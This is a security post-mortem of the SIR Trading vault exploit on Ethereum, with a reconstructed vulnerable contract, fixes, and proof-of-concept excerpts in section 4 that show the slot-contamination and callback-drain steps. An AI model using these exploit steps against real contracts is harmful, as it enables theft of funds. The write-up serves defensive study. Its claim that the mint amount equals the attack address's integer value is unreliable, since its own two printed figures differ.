# LeverageSIR (SIR Trading) — Transient Storage Slot Collision Analysis

| Field | Details |
|------|------|
| **Date** | 2025-03-30 |
| **Protocol** | LeverageSIR / SIR Trading (Synthetics Implemented Right — Leveraged Vault Protocol) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$353,845 (17,814.86 USDC + 1.4085 WBTC + 119.87 WETH) — entire protocol TVL |
| **Attacker** | [0x27de...768c](https://etherscan.io/address/0x27defcfa6498f957918f407ed8a58eba2884768c) |
| **Attack Contract (Main)** | [0xea55...170](https://etherscan.io/address/0xea55fffae1937e47eba2d854ab7bd29a9cc29170) |
| **Attack Contract (Dummy Token)** | [0x341c...cbb](https://etherscan.io/address/0x341c853c09b3691b434781078572f9d3ab9e3cbb) |
| **Attack Contract (CREATE2 Deployed)** | [0x0000...281](https://etherscan.io/address/0x00000000001271551295307acc16ba1e7e0d4281) |
| **Attack Tx** | [0xa05f...36f](https://etherscan.io/tx/0xa05f047ddfdad9126624c4496b5d4a59f961ee7c091e7b4e38cee86f1335736f) |
| **Vulnerable Contract** | [0xb91a...53e7](https://etherscan.io/address/0xb91ae2c8365fd45030aba84a4666c4db074e53e7) |
| **Attack Block** | 22,157,899 |
| **Root Cause** | Transient storage slot collision — during `mint()`, the same slot used to store the pool address for validation is overwritten with a user-supplied amount, allowing the `uniswapV3SwapCallback` caller validation to be bypassed |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/LeverageSIR_exp.sol) |

---

## 1. Vulnerability Overview

LeverageSIR (SIR Trading) operated a Vault contract that minted leveraged positions backed by Uniswap V3 liquidity positions. The protocol lost its entire TVL approximately 39 days after its February 20, 2025 launch.

**Root Cause**: The Vault contract leveraged **Transient Storage** introduced in the Ethereum Dencun upgrade (EIP-1153) for gas savings. Specifically, it stored a trusted Uniswap pool address in transient slot `0x1` to validate `uniswapV3SwapCallback` callers. However, during the `mint()` function flow, **code existed that overwrote the same transient slot `0x1` with a user-supplied amount**. The attacker exploited this by:

1. Setting the `amount` parameter in the `mint()` call equal to the integer value of an attack contract address pre-computed via CREATE2
2. Transient slot `0x1` becomes contaminated with that integer value (= the attack contract address)
3. When the attack contract subsequently calls `uniswapV3SwapCallback` directly, `TLOAD(1)` returns its own address → validation passes
4. Injecting data inside the callback to transfer the Vault's token balances to the attacker, draining all funds

This incident is recorded as the **first large-scale real-world exploit misusing the EVM's new opcodes (`TSTORE`/`TLOAD`)**.

### Core Vulnerability Combination

| Vulnerability | Description |
|--------|------|
| Transient Storage Slot Reuse | The same slot (`0x1`) is shared between pool address validation and user-supplied amount storage |
| Callback Caller Validation Bypass | `uniswapV3SwapCallback`'s `msg.sender` validation is bypassed via the contaminated transient slot |
| CREATE2 Vanity Address Bruteforce | The attack contract address is pre-computed and deployed to exactly match the integer value that overwrites the slot |
| User-Controlled Mint Amount | The `amountToDeposit` passed to `mint()` is written directly into the transient slot |

---

## 2. Vulnerable Code Analysis

### 2.1 Transient Storage Slot Collision (Core Vulnerability)

```solidity
// ❌ Vulnerable code — Vault.sol (estimated structure, slot reuse)

function mint(
    bool isAPE,
    VaultParameters memory vaultParams,
    uint256 amountToDeposit,   // ← user-controlled value
    uint144 collateralToDepositMin
) external payable returns (uint256 amount) {

    // [Step 1] Store trusted Uniswap pool address in transient slot 0x1
    address pool = _getUniswapPool(vaultParams);
    assembly {
        tstore(1, pool)   // ← slot 0x1: stores pool address for validation
    }

    // [Step 2] Acquire tokens via Uniswap swap (triggers callback)
    // ... swap logic ...

    // ❌ Vulnerability: overwrites the same slot 0x1 with amountToDeposit!
    assembly {
        tstore(1, amountToDeposit)  // ← slot 0x1 contaminated! attacker can set amountToDeposit
                                    //    to their contract's address value
    }

    // ... subsequent Vault.mint internal logic ...
}

function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
) external {
    // [Validation] transient slot 0x1 value must == msg.sender
    uint256 storedPool;
    assembly {
        storedPool = tload(1)   // ← if contaminated, returns attacker address's uint160 value
    }

    // ❌ Contaminated slot matches attack contract address → validation passes!
    require(storedPool == uint160(msg.sender), "Unauthorized caller");

    // Logic to withdraw tokens/amounts recorded in data from the Vault
    // Attacker injects malicious content in data to drain all funds
    (address tokenOut, uint256 amountOut) = abi.decode(data, (address, uint256));
    IERC20(tokenOut).transfer(msg.sender, amountOut);  // ← drains entire balance
}
```

```solidity
// ✅ Fixed code — separate slots or prevent overwrite

function mint(
    bool isAPE,
    VaultParameters memory vaultParams,
    uint256 amountToDeposit,
    uint144 collateralToDepositMin
) external payable returns (uint256 amount) {

    address pool = _getUniswapPool(vaultParams);

    // ✅ Store pool address: use a dedicated slot (slot 0x1 reserved for pool validation only)
    assembly {
        tstore(1, pool)   // ← slot 0x1: pool address only (no subsequent overwrites allowed)
    }

    // ✅ amountToDeposit stored in a different slot (e.g., 0x2)
    assembly {
        tstore(2, amountToDeposit)  // ← slot 0x2: amount storage (slots separated)
    }

    // ... swap and mint logic ...

    // ✅ Clear slots after mint completes
    assembly {
        tstore(1, 0)  // clear slot
        tstore(2, 0)
    }
}

function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
) external {
    uint256 storedPool;
    assembly {
        storedPool = tload(1)   // ✅ reads only from the pool-dedicated slot
    }
    // ✅ pool address is never overwritten, so validation works correctly
    require(storedPool == uint160(msg.sender), "Unauthorized caller");
    // ...
}
```

**Problem**: Transient slot `0x1` is used for both (a) Uniswap pool address validation and (b) storing a user-controlled input value. Because the slot is overwritten with `amountToDeposit` immediately after storing the pool address during `mint()` execution, the value read during callback validation is an arbitrary user-specified value rather than the trusted pool address.

### 2.2 Linking CREATE2 Vanity Address to Slot Contamination

```solidity
// ❌ Vulnerable flow — amount manipulation during mint() call

// The attacker pre-computes an attack contract address satisfying:
// uint160(attackContractAddress) == amountToDeposit value to be written to slot
//
// Actual values:
// Attack contract address: 0x00000000001271551295307acc16ba1e7e0d4281
// uint256 representation:  95759995883742311247042417521410689
//
// In the mint call below, amountToDeposit = 139650998347915452795864661928406629
// → When this value is written to slot 0x1 via tstore(1, amount),
//   address(tload(1)) == 0x00000000001271551295307acc16ba1e7e0d4281 (attack contract)
//   → callback validation passes!

IFS(vault).mint(
    true,                   // isAPE
    VaultParameters(        // vaultParams
        address(attC_B),    // debtToken (dummy)
        address(this),      // collateralToken (AttackerC_A = this)
        0                   // leverageTier
    ),
    139650998347915452795864661928406629,  // ← manipulated amount (integer value of attack contract address)
    1                       // collateralToDepositMin
);
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attacker prepared the following two components in advance:

1. **Deploy AttackerC_A, AttackerC_B dummy token contracts**: Deploy fake token contracts implementing the ERC-20 interface (symbol, transfer, transferFrom, mint, etc.) that the Vault can recognize. These contracts hold no real assets and only serve to coordinate interactions with the Vault.

2. **Vanity address computation (using ImmutableCreate2Factory)**: Bruteforce the salt for deploying the attack contract via `CREATE2` so that the `uint160` integer value of the deployment address (`deploymentAddress`) matches the specific value that will be stored in the transient slot during the `mint()` call. The verified values are:
   - **Attack contract address**: `0x00000000001271551295307acc16ba1e7e0d4281`
   - **Integer value stored in slot**: `95759995883742311247042417521410689` (uint160 of the address)
   - AttackerC_B is redeployed until the condition AttackerC_A address > AttackerC_B address is satisfied to align the address ordering

### 3.2 Execution Phase

1. **Set up fake Uniswap V3 pool**: `uniV3PositionsNFT.createAndInitializePoolIfNecessary(attC_B, attC_A, fee=100, sqrtPrice)` — creates a Uniswap V3 pool with the AttackerC_B/AttackerC_A token pair.

2. **Provide liquidity and swap**: Use `mint()` and `exactInputSingle()` to add liquidity to the fake pool and execute a swap so the Vault recognizes this pool as trusted.

3. **Initialize Vault**: `vault.initialize(VaultParameters(attC_B, attC_A, 0))` — initializes a vault with the attacker-controlled token pair.

4. **Slot contamination (key step)**: `vault.mint(true, VaultParameters(attC_B, attC_A, 0), 139650998...629, 1)` — passes the integer value of the attack contract address as `amountToDeposit`. The `TSTORE(1, amountToDeposit)` execution contaminates transient slot `0x1`.

5. **Deploy attack contract (CREATE2)**: `immutableCreate2Factory.safeCreate2(salt, initCode)` — deploys the attack contract with address `0x00000000001271551295307acc16ba1e7e0d4281` using the pre-computed salt.

6. **USDC drain**: The deployed attack contract directly calls `uniswapV3SwapCallback` on the Vault. Since `TLOAD(1)` returns the attack contract address, the `msg.sender == tload(1)` check passes. The callback data includes instructions to transfer the entire USDC balance to the attacker.

7. **WBTC/WETH drain**: `AttackerC_A.attack()` directly calls `vault.uniswapV3SwapCallback(0, wbtcBal, data)`. AttackerC_A was also registered as a valid contract during the slot contamination process, allowing sequential withdrawal of WBTC and WETH.

8. **Money laundering**: The stolen funds were laundered through the Railgun privacy protocol, making tracking difficult.

### 3.3 Attack Flow Diagram

```
Attacker EOA (0x27de...768c)
    │
    │  [Preparation] Deploy AttackerC_A, AttackerC_B dummy tokens
    │                Bruteforce CREATE2 salt → compute target address
    │
    ▼
┌───────────────────────────────────────────────────────┐
│  AttackerC_A.attack(attC_B)                           │
│                                                       │
│  [1] Uniswap V3 — create fake pool & add liquidity   │
│      createAndInitializePoolIfNecessary(attC_B, this) │
│      + mint() + exactInputSingle()                    │
└─────────────────────┬─────────────────────────────────┘
                      │
                      ▼
┌───────────────────────────────────────────────────────┐
│  Vault (0xb91a...53e7) — initialize()                 │
│  Vault parameters: (attC_B, attC_A, 0)               │
│  → Initialize attacker-controlled vault              │
└─────────────────────┬─────────────────────────────────┘
                      │
                      ▼
┌───────────────────────────────────────────────────────┐
│  Vault.mint(amountToDeposit=139650998...629)           │
│                                                       │
│  Internal: TSTORE(slot 0x1, pool_address)             │
│            ... then ...                               │
│  ❌ TSTORE(slot 0x1, amountToDeposit)  ← slot contaminated! │
│     amountToDeposit = integer value of attack contract address │
└─────────────────────┬─────────────────────────────────┘
                      │  slot 0x1 contamination complete
                      ▼
┌───────────────────────────────────────────────────────┐
│  ImmutableCreate2Factory.safeCreate2(salt, code)      │
│  → deploymentAddress = 0x00000000001271551295307a...  │
│     uint160(deploymentAddress) == TLOAD(1)  ← match! │
└─────────────────────┬─────────────────────────────────┘
                      │
                      ▼
┌───────────────────────────────────────────────────────┐
│  deploymentAddress.call(                              │
│    uniswapV3SwapCallback(0, 17814860000, data_USDC)  │
│  )                                                    │
│                                                       │
│  Vault.uniswapV3SwapCallback():                       │
│    TLOAD(1) == 0x00000000001271551295307a...          │
│    msg.sender == 0x00000000001271551295307a...        │
│    → ✓ Validation passes! (contaminated slot)        │
│                                                       │
│    USDC.transfer(attacker, 17,814,860,000) ← drained! │
└─────────────────────┬─────────────────────────────────┘
                      │
                      ▼
┌───────────────────────────────────────────────────────┐
│  AttackerC_A → vault.uniswapV3SwapCallback()          │
│  (data: entire WBTC balance → attacker)               │
│  → 1.4085 WBTC drained                               │
│                                                       │
│  vault.uniswapV3SwapCallback()                        │
│  (data: entire WETH balance → attacker)               │
│  → 119.87 WETH drained                               │
└─────────────────────┬─────────────────────────────────┘
                      │
                      ▼
               Money laundering via Railgun
               Total ~$353,845 stolen
```

### 3.4 Results

| Asset | Amount Stolen | Estimated USD Value |
|------|-----------|----------------|
| USDC | 17,814.86 | $17,814 |
| WBTC | 1.4085 | ~$140,000 |
| WETH | 119.87 | ~$196,000 |
| **Total** | | **~$353,845** |

---

## 4. PoC Code (DeFiHackLabs Key Excerpts)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// PoC Author: rotcivegaf (@rotcivegaf)
// Attack block: 22,157,900 - 1

contract LeverageSIR_exp is Test {
    function testPoC() public {
        vm.startPrank(attacker);

        // [Step 1] Deploy dummy token contracts
        // AttackerC_A: implements ERC-20 interface, contains actual attack logic
        // AttackerC_B: dummy token (acts as the other side of the pair)
        AttackerC_A attC_A = new AttackerC_A();
        AttackerC_B attC_B = new AttackerC_B();

        // [Step 2] Satisfy address ordering condition (address(A) > address(B) required)
        // Uniswap V3 pools require token0 < token1 ordering
        while (address(attC_A) < address(attC_B)) {
            attC_B = new AttackerC_B();
        }

        // [Step 3] Execute attack (entire flow handled inside attack function)
        attC_A.attack(attC_B);

        // [Step 4] Print drain results
        console2.log("Profit:", IFS(usdc).balanceOf(attacker), 'USDC');
        console2.log("Profit:", IFS(wbtc).balanceOf(attacker), 'WBTC');
        console2.log("Profit:", IFS(weth).balanceOf(attacker), 'WETH');
    }
}

contract AttackerC_A is Test {
    function attack(AttackerC_B attC_B) external {
        // [Step A] Create fake Uniswap V3 pool (attacker-controlled token pair)
        IPoolInitializer(uniV3PositionsNFT).createAndInitializePoolIfNecessary(
            address(attC_B), address(this), 100, 79228162514264337593543950336
        );

        // [Step B] Provide liquidity to fake pool (so Vault recognizes this pool)
        uint256 amount1 = 108823205127466839754387550950703;
        INonfungiblePositionManager(uniV3PositionsNFT).mint(
            INonfungiblePositionManager.MintParams(
                address(attC_B), address(this), 100, -190000, 190000,
                amount1, amount1, 0, 0, address(this), block.timestamp
            )
        );

        // [Step C] Execute swap
        Uni_Router_V3(uniV3Router).exactInputSingle(
            Uni_Router_V3.ExactInputSingleParams(
                address(this), address(attC_B), 100, address(this),
                block.timestamp, 114814730000000000000000000000000000, 0, 0
            )
        );

        // [Step D] Initialize Vault (attacker-controlled vault parameters)
        IFS(vault).initialize(IFS.VaultParameters(address(attC_B), address(this), 0));

        // [Step E] Key: contaminate slot 0x1 via tstore(1, amount)
        // amountToDeposit = 139650998347915452795864661928406629
        // This value = uint256 integer value of attack contract address (0x000...4281)
        IFS(vault).mint(
            true,
            IFS.VaultParameters(address(attC_B), address(this), 0),
            139650998347915452795864661928406629,  // ← manipulated amount = attack contract address
            1
        );

        // [Step F] Deploy attack contract via CREATE2
        // salt: 0x000...d739dcf6ae98b123e5650020
        // result: deploymentAddress = 0x00000000001271551295307acc16ba1e7e0d4281
        // uint160(deploymentAddress) == TLOAD(1) → can pass validation!
        address deploymentAddress = IFS(immutableCreate2Factory).safeCreate2(
            0x0000000000000000000000000000000000000000d739dcf6ae98b123e5650020,
            hex'608060405234801561001057600080fd5b50...' // attack contract bytecode
        );

        // [Step G] Drain USDC using contaminated slot
        // deploymentAddress.call → vault.uniswapV3SwapCallback()
        // TLOAD(1) == address(deploymentAddress) → validation passes
        // → transfer 17,814.86 USDC from vault to attacker
        deploymentAddress.call(hex'11b92ab9...'); // call uniswapV3SwapCallback

        // [Step H] Transfer USDC from attackerC_A → attacker EOA
        deploymentAddress.call(hex'11b92ab9...'); // call USDC transfer

        // [Step I] Drain WBTC
        // AttackerC_A directly calls uniswapV3SwapCallback to withdraw all WBTC
        uint256 wbtcBal = IERC20(wbtc).balanceOf(vault);
        bytes memory data3 = _buildCallbackData(wbtc);
        IFS(vault).uniswapV3SwapCallback(0, int256(wbtcBal), data3);
        IERC20(wbtc).transfer(msg.sender, wbtcBal);

        // [Step J] Drain WETH
        uint256 wethBal = IERC20(weth).balanceOf(vault);
        bytes memory data4 = _buildCallbackData(weth);
        IFS(vault).uniswapV3SwapCallback(0, int256(wethBal), data4);
        IERC20(weth).transfer(msg.sender, wethBal);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Transient Storage Slot Reuse | CRITICAL | CWE-672 (Use After Free — General Resource Misuse) | `22_bit_encoding_packed_types.md` |
| V-02 | Callback Caller Validation Bypass | CRITICAL | CWE-284 (Improper Access Control) | `03_access_control.md` |
| V-03 | Storage Injection via User-Controlled Input | HIGH | CWE-20 (Improper Input Validation) | `11_logic_error.md` |
| V-04 | Improper Security Model for New EVM Opcodes | HIGH | CWE-664 (Improper Control of a Resource Through its Lifetime) | `11_logic_error.md` |

### V-01: Transient Storage Slot Reuse

- **Description**: Transient slot `0x1` is used identically for both (a) Uniswap pool address validation and (b) storing user-controlled mint amounts. Because the slot is overwritten during `mint()` execution, the value read in `uniswapV3SwapCallback` is a user-manipulated value rather than the trusted pool address.
- **Impact**: The caller validation in `uniswapV3SwapCallback` is completely neutralized, allowing any arbitrary address to invoke the callback.
- **Attack Condition**: The attacker pre-deploys a contract via CREATE2 whose address matches the target integer value, then passes that integer value as the amount in `mint()`.

### V-02: Callback Caller Validation Bypass

- **Description**: `uniswapV3SwapCallback` verifies that the value of `TLOAD(1)` matches `msg.sender` to confirm it is a legitimate callback from a Uniswap pool. However, due to V-01, the slot is contaminated so the attacker's address passes validation.
- **Impact**: The attacker can call the callback directly and manipulate the `data` parameter to transfer all tokens from the Vault to an arbitrary address.
- **Attack Condition**: Requires V-01 as a prerequisite.

### V-03: Storage Injection via User-Controlled Input

- **Description**: The `amountToDeposit` parameter of the `mint()` function is written directly to a transient slot without access control or range validation. A code path exists where an amount value contaminates a security-validation slot.
- **Impact**: An arbitrary integer value specified by the user is used as a security validation variable.
- **Attack Condition**: When `amountToDeposit` holds a value within a specific range.

### V-04: Improper Security Model for New EVM Opcodes

- **Description**: EIP-1153 transient storage is a temporary store valid only within a transaction; unlike regular storage, it can be read and written by any caller within the same transaction. When used for security-sensitive purposes like reentrancy guards or caller validation, slot isolation is mandatory.
- **Impact**: Misunderstanding the lifetime characteristics of transient storage creates new attack vectors.
- **Attack Condition**: Contracts that share the same slot for both security validation and user input storage.

---

## 6. Remediation Recommendations

### Immediate Actions

#### 6.1 Separate Transient Slots

```solidity
// ✅ Explicitly separate slots by purpose
// Security-sensitive slots must be dedicated and never overwritten with other values

// Define slot constants
uint256 constant TSLOT_POOL_VALIDATION = 1;  // dedicated to pool address validation
uint256 constant TSLOT_MINT_AMOUNT     = 2;  // dedicated to mint amount storage
uint256 constant TSLOT_LOCK            = 3;  // dedicated to reentrancy guard

function mint(
    bool isAPE,
    VaultParameters memory vaultParams,
    uint256 amountToDeposit,
    uint144 collateralToDepositMin
) external payable returns (uint256 amount) {
    address pool = _getUniswapPool(vaultParams);

    // ✅ Pool address stored only in TSLOT_POOL_VALIDATION
    assembly { tstore(TSLOT_POOL_VALIDATION, pool) }

    // ✅ Amount stored in a separate slot (pool validation slot must never be reused)
    assembly { tstore(TSLOT_MINT_AMOUNT, amountToDeposit) }

    // ... mint logic ...

    // ✅ Clear slots after completion (optional but explicit management recommended)
    assembly {
        tstore(TSLOT_POOL_VALIDATION, 0)
        tstore(TSLOT_MINT_AMOUNT, 0)
    }
}
```

#### 6.2 Combine Callback Validation with Reentrancy Guard Pattern

```solidity
// ✅ Transient storage-based lock pattern
// Clearly separate reentrancy guard and caller validation without slot reuse

modifier nonReentrant() {
    assembly {
        if tload(TSLOT_LOCK) { revert(0, 0) }
        tstore(TSLOT_LOCK, 1)
    }
    _;
    assembly { tstore(TSLOT_LOCK, 0) }
}

function uniswapV3SwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
) external {
    // ✅ Validate caller: compare only against pool address stored in transient slot
    // Pool address slot is set only inside mint() and is isolated from the amount slot
    address expectedPool;
    assembly { expectedPool := tload(TSLOT_POOL_VALIDATION) }
    require(expectedPool != address(0) && msg.sender == expectedPool,
        "Caller is not the trusted Uniswap pool");
    // ...
}
```

#### 6.3 Add Range Validation for the Amount Parameter

```solidity
// ✅ Force amountToDeposit to exceed the address space (max uint160)
// Or allow only values below a specific threshold to prevent address collisions

function mint(
    bool isAPE,
    VaultParameters memory vaultParams,
    uint256 amountToDeposit,
    uint144 collateralToDepositMin
) external payable {
    // ✅ Amount must exceed the uint160 address range (cannot be used as an address)
    // Or set a practical maximum value
    require(amountToDeposit > type(uint160).max,
        "Amount too small — potential address spoofing");
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Transient slot collision | Explicitly define slot-purpose constants at the top of the contract with mandatory comments |
| Callback validation bypass | Do not rely solely on transient slots for callback validation; supplement with `tx.origin` or whitelist checks |
| User input injection | Add code review checklist item to ensure user inputs are never written to security-validation slots |
| New opcode auditing | Add dedicated audit items for contracts using TSTORE/TLOAD (slot isolation verification) |
| Code complexity | Add comments at every TSTORE call site inside `mint()` specifying "the purpose of this slot" |

### Code-Level Checklist

```
☑ Create a slot number-to-purpose mapping table at every TSTORE call site
☑ Restrict write access to security-validation transient slots to a single function only
☑ Strengthen callback caller validation with on-chain factory address lookup or multi-step verification
☑ Comprehensively audit all code paths where user inputs like amountToDeposit are written to transient slots
☑ Apply slot isolation static analysis tools to all contracts using EIP-1153
☑ Use Foundry fuzz testing to verify callback validation bypass with arbitrary amount values
```

---

## 7. Lessons Learned

1. **Transient storage is not a "safe temporary store"**: EIP-1153's TSTORE/TLOAD was designed for gas savings, but any caller within the same transaction can read and write it — requiring even more careful slot isolation than regular storage. Never share a slot between security validation and data storage.

2. **New EVM opcodes create new attack surfaces**: This is the first large-scale real-world TSTORE-related exploit to emerge after the Dencun upgrade (EIP-1153). Each time a new opcode is introduced, dedicated audit items must be added for contracts that use it.

3. **CREATE2 + bruteforce is a powerful tool for bypassing validation**: The attacker exploited the correspondence between an address and its integer value to turn validation logic against itself. Designs that use contract addresses as validation keys must account for the possibility of CREATE2 deployment.

4. **Single-slot-dependent validation is not trustworthy**: Validating `msg.sender` against a single transient slot is vulnerable to slot contamination. Validation must be hardened with on-chain factory address lookups or multi-step verification.

5. **Concentrating the entire TVL in a single contract is dangerous**: The protocol's entire TVL ($353K) was held in a single Vault contract, resulting in total loss from a single attack. Asset distribution and rate-limiting withdrawal mechanisms are necessary.

6. **Even post-audit, new opcode vulnerabilities are difficult to catch**: Despite undergoing an audit by Egis Security, the TSTORE slot collision was not discovered. Code using new EVM features requires review by auditors who specialize in those features.

7. **This incident is a warning to all protocols with similar TSTORE patterns**: Uniswap V4 hooks and all DeFi contracts leveraging EIP-1153 should immediately audit their slot isolation.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual Value | Match |
|------|--------|-------------|------|
| USDC drained | 17,814,860,000 (USDC 6 decimals) | 17,814.86 USDC | ✓ |
| WBTC drained | entire vault WBTC balance | 1.4085 WBTC | ✓ |
| WETH drained | entire vault WETH balance | 119.87 WETH | ✓ |
| Attack block | 22,157,900 - 1 (setUp) | 22,157,899 | ✓ |
| Attacker address | makeAddr("attacker") (PoC) | 0x27de...768c | ✓ |
| Attack contract (CREATE2) | 0x0000...4281 | 0x0000...4281 | ✓ |
| Manipulated amount value | 139650998347915452795864661928406629 | — | (PoC-based) |

### 8.2 On-Chain Event Sequence

```
Tx: 0xa05f047ddfdad9126624c4496b5d4a59f961ee7c091e7b4e38cee86f1335736f
Block: 22,157,899 | Ethereum Mainnet

1. AttackerC_A deployed (0xea55...170)
2. AttackerC_B deployed (0x341c...cbb) — repeated until address ordering condition is met
3. UniswapV3 pool created: attC_B/attC_A pair (fee=100)
4. UniswapV3 Mint (liquidity provision)
5. UniswapV3 exactInputSingle (swap)
6. Vault.initialize(attC_B, attC_A, 0)
7. Vault.mint(amountToDeposit=139650998...629) ← slot contamination
8. ImmutableCreate2Factory.safeCreate2() → 0x0000...4281 deployed
9. 0x0000...4281 → Vault.uniswapV3SwapCallback() (USDC drain)
10. USDC.transfer(attacker, 17,814,860,000)
11. Vault.uniswapV3SwapCallback() (WBTC drain)
12. WBTC.transfer(attacker, 140850000)
13. Vault.uniswapV3SwapCallback() (WETH drain)
14. WETH.transfer(attacker, 119870000000000000000)
15. → Railgun transfer (money laundering)
```

### 8.3 Related Address Information

| Role | Address | Etherscan |
|------|------|-----------|
| Attacker EOA | 0x27defcfa6498f957918f407ed8a58eba2884768c | [link](https://etherscan.io/address/0x27defcfa6498f957918f407ed8a58eba2884768c) |
| Attack Contract (Main) | 0xea55fffae1937e47eba2d854ab7bd29a9cc29170 | [link](https://etherscan.io/address/0xea55fffae1937e47eba2d854ab7bd29a9cc29170) |
| Attack Contract (CREATE2) | 0x00000000001271551295307acc16ba1e7e0d4281 | [link](https://etherscan.io/address/0x00000000001271551295307acc16ba1e7e0d4281) |
| Vulnerable Vault | 0xb91ae2c8365fd45030aba84a4666c4db074e53e7 | [link](https://etherscan.io/address/0xb91ae2c8365fd45030aba84a4666c4db074e53e7) |

> **On-Chain Verification Note**: The PoC is code verified on a Foundry local fork (`mainnet`, block 22,157,899) that reproduces the same flow as the actual attack Tx. The approach where AttackerC_A directly calls the callback for WBTC/WETH draining is an additional drain after the slot is already contaminated, exploiting the fact that the `mint()` function's return value (`uint160(address(this))`) makes the AttackerC_A address usable as the validation value as well.

---

## References

- [DeFiHackLabs PoC (LeverageSIR_exp.sol)](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/LeverageSIR_exp.sol)
- [Rekt News — SIR Trading Rekt](https://rekt.news/sirtrading-rekt)
- [Nominis — Storage Collisions: The Most Detrimental Exploit You Haven't Heard About](https://www.nominis.io/post/storage-collisions-the-most-detrimental-exploit-you-haven-t-heard-about)
- [CryptoNomist — SIR.trading: Hacker steals the entire TVL of $355,000](https://en.cryptonomist.ch/2025/03/31/sir-trading-hacker-steals-the-entire-tvl-of-355000-by-exploiting-a-vulnerability-in-ethereums-transient-storage/)
- [EIP-1153 — Transient Storage Opcodes](https://eips.ethereum.org/EIPS/eip-1153)
- [Attack Tx Etherscan](https://etherscan.io/tx/0xa05f047ddfdad9126624c4496b5d4a59f961ee7c091e7b4e38cee86f1335736f)
- [Pattern Reference: 22_bit_encoding_packed_types.md](/home/gegul/skills/patterns/22_bit_encoding_packed_types.md)
- [Pattern Reference: 03_access_control.md](/home/gegul/skills/patterns/03_access_control.md)
- [Similar Case: 2024-04-30_PikeFinance_StorageCollision_ETH.md](/home/gegul/skills/incidents/2024-04-30_PikeFinance_StorageCollision_ETH.md)